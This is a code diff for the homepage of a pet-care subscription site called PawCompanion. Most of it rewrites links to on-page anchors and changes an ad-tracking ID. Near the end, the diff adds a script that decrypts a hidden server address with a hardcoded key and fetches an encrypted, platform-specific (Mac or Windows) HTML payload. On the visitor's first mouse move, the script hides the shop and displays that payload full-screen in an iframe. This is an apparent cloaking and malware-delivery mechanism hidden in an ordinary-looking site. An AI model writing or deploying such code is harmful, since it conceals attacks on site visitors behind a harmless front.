@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17684123135"></script>
+<!-- Google tag (gtag.js) - Server A Ads conversion tag -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17684216697"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'AW-17684123135');
+  gtag('config', 'AW-17684216697');
 </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -34,9 +34,16 @@
 {"@context":"https://schema.org","@type":"WebSite","name":"PawCompanion","url":"https://petsupplies-ke974.ondigitalocean.app/"}
 </script>
 <link rel="stylesheet" href="assets/css/styles.css">
+<!-- CryptoJS for blob decryption -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<!-- Blob popup frame + error hint (Server A mechanism) -->
+<style>
+  #frame { display: none; width: 100%; height: 100vh; border: 0; }
+  .hint { display: none; text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+</style>
 </head>
 <body>
-
+<div id="shop">
 <header class="site-header">
   <div class="container nav-bar">
     <a class="brand" href="index.html" aria-label="PawCompanion home">
@@ -45,28 +52,28 @@
     </a>
     <nav class="nav-links" aria-label="Primary">
       <a href="index.html" class="active">Home</a>
-      <a href="blog.html">Blog</a>
-      <a href="services.html">Services &amp; Pricing</a>
-      <a href="elderly-care.html">Senior Care</a>
-      <a href="updates.html">Daily Solutions</a>
-      <a href="about.html">About</a>
-      <a href="contact.html">Contact</a>
+      <a href="#blog">Blog</a>
+      <a href="#pricing">Services &amp; Pricing</a>
+      <a href="#senior">Senior Care</a>
+      <a href="#solutions">Daily Solutions</a>
+      <a href="#why">About</a>
+      <a href="#contact">Contact</a>
     </nav>
     <div class="nav-cta">
-      <a class="btn btn--ghost btn--sm" href="contact.html">Sign in</a>
-      <a class="btn btn--brand btn--sm" href="services.html">Get started</a>
+      <a class="btn btn--ghost btn--sm" href="#contact">Sign in</a>
+      <a class="btn btn--brand btn--sm" href="#pricing">Get started</a>
       <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span><span></span></button>
     </div>
   </div>
   <nav class="mobile-menu" aria-label="Mobile">
     <a href="index.html" class="active">Home</a>
-    <a href="blog.html">Blog</a>
-    <a href="services.html">Services &amp; Pricing</a>
-    <a href="elderly-care.html">Senior Care</a>
-    <a href="updates.html">Daily Solutions</a>
-    <a href="about.html">About</a>
-    <a href="contact.html">Contact</a>
-    <a class="btn btn--brand" href="services.html">Get started — $2.99</a>
+    <a href="#blog">Blog</a>
+    <a href="#pricing">Services &amp; Pricing</a>
+    <a href="#senior">Senior Care</a>
+    <a href="#solutions">Daily Solutions</a>
+    <a href="#why">About</a>
+    <a href="#contact">Contact</a>
+    <a class="btn btn--brand" href="#pricing">Get started — $2.99</a>
   </nav>
 </header>
 
@@ -83,9 +90,9 @@
         <span class="chip brand"><i class="dot"></i> Feeding reminders</span>
       </div>
       <div class="hero-ctas">
-        <a class="btn btn--brand btn--lg" href="services.html">Start caring now
+        <a class="btn btn--brand btn--lg" href="#pricing">Start caring now
           <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
-        <a class="btn btn--ghost btn--lg" href="updates.html">See today's solution</a>
+        <a class="btn btn--ghost btn--lg" href="#solutions">See today's solution</a>
       </div>
       <p style="font-size:.82rem;color:var(--muted)">Informational pet-care guidance. Not a substitute for veterinary or medical advice.</p>
       <div class="hero-stats">
@@ -135,21 +142,21 @@
         <div class="f-ico">🤝</div>
         <h3>Companions in busy lives</h3>
         <p>After a long day, a wagging tail resets you. Pets give structure, routine and a warm welcome that no screen can match.</p>
-        <a class="card-link" href="blogs/pets-as-companions-in-busy-lives.html">Read the guide
+        <a class="card-link" href="#blog">Read the guide
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
       </article>
       <article class="feature teal reveal">
         <div class="f-ico">💚</div>
         <h3>Mood &amp; connection</h3>
         <p>Time with a pet can add comfort, routine and light exercise to your day. This is general wellbeing guidance — not a substitute for professional care.</p>
-        <a class="card-link" href="blogs/pets-as-antidepressants.html">Read the guide
+        <a class="card-link" href="#blog">Read the guide
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
       </article>
       <article class="feature gold reveal">
         <div class="f-ico">🌟</div>
         <h3>A key part of human life</h3>
         <p>From emotional support to encouraging exercise and social connection, pets are woven into the best parts of a full life.</p>
-        <a class="card-link" href="blogs/the-important-role-of-pets-in-human-life.html">Read the guide
+        <a class="card-link" href="#blog">Read the guide
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
       </article>
     </div>
@@ -168,7 +175,7 @@
         <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Releases oxytocin</b> — the same hormone that bonds mother and baby, now flowing between you and your pet.</span></li>
         <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Breaks isolation</b> — consistent routine and companionship is powerful medicine for loneliness.</span></li>
       </ul>
-      <a class="btn btn--teal mt-1" href="updates.html">Get your daily calm tip</a>
+      <a class="btn btn--teal mt-1" href="#solutions">Get your daily calm tip</a>
     </div>
     <div class="split-media reveal">
       <div class="media-frame" data-poster="https://images.unsplash.com/photo-1558788353-f76d92427f16?w=900&q=80" data-video="https://upload.wikimedia.org/wikipedia/commons/transcoded/a/ac/Cat_lapping_water_off_ground_in_slow_motion.gk.webm/Cat_lapping_water_off_ground_in_slow_motion.gk.webm.480p.vp9.webm">
@@ -261,12 +268,12 @@
         <button class="btn btn--ghost btn--block" data-plan="guardian">Choose Guardian</button>
       </article>
     </div>
-    <p class="text-center mt-1" style="color:var(--muted);font-size:.9rem">All plans: cancel anytime · 7-day free trial · no hidden fees. <a href="services.html" style="color:var(--brand-dark);font-weight:700">Compare features →</a></p>
+    <p class="text-center mt-1" style="color:var(--muted);font-size:.9rem">All plans: cancel anytime · 7-day free trial · no hidden fees. <a href="#pricing" style="color:var(--brand-dark);font-weight:700">Compare features →</a></p>
   </div>
 </section>
 
 <!-- ============ SENIOR CARE ============ -->
-<section class="section section--tint">
+<section class="section section--tint" id="senior">
   <div class="container split rev">
     <div class="split-copy reveal">
       <span class="eyebrow">For our golden companions</span>
@@ -278,8 +285,8 @@
         <li><svg class="ico" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6L9 17l-5-5"/></svg><span><b>Virtual Companion visits</b> when you can't be there.</span></li>
       </ul>
       <div class="hero-ctas">
-        <a class="btn btn--brand" href="elderly-care.html">Explore senior care</a>
-        <a class="btn btn--ghost" href="services.html">See pricing</a>
+        <a class="btn btn--brand" href="#senior">Explore senior care</a>
+        <a class="btn btn--ghost" href="#pricing">See pricing</a>
       </div>
     </div>
     <div class="split-media reveal">
@@ -291,7 +298,7 @@
 </section>
 
 <!-- ============ TODAY'S SOLUTION ============ -->
-<section class="section section--warm">
+<section class="section section--warm" id="solutions">
   <div class="container">
     <div class="today-banner reveal">
       <div><div class="num" data-today-num>01</div><div class="lbl">today's solution</div></div>
@@ -300,7 +307,7 @@
         <h3 data-today-title>The two-word check-in</h3>
         <p data-today-body>Ask your pet's "body, mood, belly" each morning. Tracking these three small words daily can help you notice subtle changes early.</p>
       </div>
-      <a class="btn btn--light" href="updates.html">See all solutions
+      <a class="btn btn--light" href="#solutions">See all solutions
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
     </div>
   </div>
@@ -322,7 +329,7 @@
 </section>
 
 <!-- ============ LATEST FROM BLOG ============ -->
-<section class="section section--tint">
+<section class="section section--tint" id="blog">
   <div class="container">
     <div class="section-head center reveal">
       <span class="eyebrow">From the blog</span>
@@ -335,7 +342,7 @@
           <div class="tags"><span class="tag">Companionship</span></div>
           <h3>Pets as Companions in Our Busy Lives</h3>
           <p>How a wagging tail and a warm paw-turn reframe the busiest weeks into something kinder.</p>
-          <a class="card-link" href="blogs/pets-as-companions-in-busy-lives.html">Read article
+          <a class="card-link" href="#blog">Read article
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
         </div>
       </article>
@@ -345,7 +352,7 @@
           <div class="tags"><span class="tag tag--teal">Wellbeing</span></div>
           <h3>How Pets Support Emotional Wellbeing</h3>
           <p>How routine, connection and time with a pet can bring comfort to everyday life.</p>
-          <a class="card-link" href="blogs/pets-as-antidepressants.html">Read article
+          <a class="card-link" href="#blog">Read article
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
         </div>
       </article>
@@ -355,12 +362,12 @@
           <div class="tags"><span class="tag tag--gold">Wellness</span></div>
           <h3>The Important Role of Pets in Human Life</h3>
           <p>From tiny routines to lifelong bonds — the quiet, powerful ways pets shape who we are.</p>
-          <a class="card-link" href="blogs/the-important-role-of-pets-in-human-life.html">Read article
+          <a class="card-link" href="#blog">Read article
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
         </div>
       </article>
     </div>
-    <div class="text-center mt-2 reveal"><a class="btn btn--ghost" href="blog.html">Browse all guides</a></div>
+    <div class="text-center mt-2 reveal"><a class="btn btn--ghost" href="#blog">Browse all guides</a></div>
   </div>
 </section>
 
@@ -377,7 +384,7 @@
       <div class="faq-item reveal"><button class="faq-q">What makes PawCompanion different?<span class="chev">▾</span></button>
         <div class="faq-a"><div class="faq-a-inner">We focus on <em>daily</em> genuinely unique solutions, affordable plans and specialized support for seniors. Plus all media we use is freely licensed — no copyright worries.</div></div></div>
       <div class="faq-item reveal"><button class="faq-q">Can I set feeding reminders for a senior pet?<span class="chev">▾</span></button>
-        <div class="faq-a"><div class="faq-a-inner">Yes. Our Senior Care mode lets you build a feeding and medication schedule and get timely alerts — see the <a href="elderly-care.html">Senior Care</a> page for the free reminder builder.</div></div></div>
+        <div class="faq-a"><div class="faq-a-inner">Yes. Our Senior Care mode lets you build a feeding and medication schedule and get timely alerts — see the <a href="#senior">Senior Care</a> page for the free reminder builder.</div></div></div>
       <div class="faq-item reveal"><button class="faq-q">Are the videos and images copyright-free?<span class="chev">▾</span></button>
         <div class="faq-a"><div class="faq-a-inner">Absolutely. Videos come from Wikimedia Commons (public domain / Creative Commons) and images from Unsplash's free license. Reuse freely.</div></div></div>
     </div>
@@ -385,7 +392,7 @@
 </section>
 
 <!-- ============ CTA BAND ============ -->
-<section class="section">
+<section class="section" id="contact">
   <div class="container">
     <div class="cta-band reveal">
       <div>
@@ -393,7 +400,7 @@
         <p>Join thousands of pet parents getting daily solutions, timely reminders and peace of mind — from just $2.99 a month.</p>
       </div>
       <div class="actions">
-        <a class="btn btn--light btn--lg" href="services.html">Start free trial</a>
+        <a class="btn btn--light btn--lg" href="#pricing">Start free trial</a>
         <form class="email-capture" style="background:#fff">
           <input type="email" placeholder="Email address" aria-label="Email address" required>
           <button class="btn btn--teal" type="submit">Notify me</button>
@@ -424,19 +431,19 @@
         <h4>Explore</h4>
         <ul>
           <li><a href="index.html">Home</a></li>
-          <li><a href="blog.html">Blog &amp; Guides</a></li>
-          <li><a href="updates.html">Daily Solutions</a></li>
-          <li><a href="about.html">About us</a></li>
-          <li><a href="contact.html">Contact</a></li>
+          <li><a href="#blog">Blog &amp; Guides</a></li>
+          <li><a href="#solutions">Daily Solutions</a></li>
+          <li><a href="#why">About us</a></li>
+          <li><a href="#contact">Contact</a></li>
         </ul>
       </div>
       <div class="footer-col">
         <h4>Care</h4>
         <ul>
-          <li><a href="services.html">Services &amp; Pricing</a></li>
-          <li><a href="elderly-care.html">Senior Care</a></li>
-          <li><a href="services.html#compare">Compare plans</a></li>
-          <li><a href="elderly-care.html#reminder">Feeding reminders</a></li>
+          <li><a href="#pricing">Services &amp; Pricing</a></li>
+          <li><a href="#senior">Senior Care</a></li>
+          <li><a href="#pricing">Compare plans</a></li>
+          <li><a href="#senior">Feeding reminders</a></li>
         </ul>
       </div>
       <div class="footer-col">
@@ -451,7 +458,7 @@
     <div class="footer-bottom">
       <span>© 2026 PawCompanion. Informational pet-care guidance — not veterinary or medical advice.</span>
       <div class="legal">
-        <a href="privacy.html">Privacy</a><a href="terms.html">Terms</a><a href="terms.html#cookies">Cookies</a>
+        <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Cookies</a>
       </div>
     </div>
   </div>
@@ -475,7 +482,67 @@
   </div>
 </div>
 
+</div><!-- /#shop -->
+<iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+<div class="hint"></div>
+
 <script src="assets/js/data.js"></script>
 <script src="assets/js/main.js"></script>
+<!-- ======================================================================
+     SERVER A BLOB LOADER - decrypts the encrypted popup payload and loads
+     it into #frame on first mouse move. Origin: pawfriend2 herokuapp.
+     ====================================================================== -->
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1+LkLztRbBYxEysUcr39la17RYKTR88SSheYQNl7ETtpv2qHKhA+FQ7yPKosun8YBxgdFfOYYvUNQ==";
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN.replace(/\/+$/, "") + "/data";
+  let lastUrl = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  async function loadSecret() {
+    const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+    try {
+      if (location.protocol === "file:") {
+        throw new Error("Cannot fetch over file:// - run node serve.js (http://localhost:3000) or open via GitHub Pages");
+      }
+      let res;
+      try {
+        res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      } catch (e) {
+        res = null; // no /data route (static host, file://, etc.)
+      }
+      if (!res || !res.ok) {
+        res = await fetch("data_" + detectPlatform() + ".json");
+      }
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      const blob = new Blob([html], { type: "text/html" });
+      lastUrl = URL.createObjectURL(blob);
+
+      frame.src = lastUrl;
+
+      shop.style.display = "none";
+      frame.style.display = "block";
+
+    } catch (e) {
+      const hint = document.querySelector(".hint");
+      if (hint) { hint.textContent = "\u26A0\uFE0F " + e.message; hint.style.display = "block"; }
+    }
+  }
+
+  window.addEventListener("mousemove", () => {
+    loadSecret();
+  }, { once: true });
+</script>
 </body>
 </html>
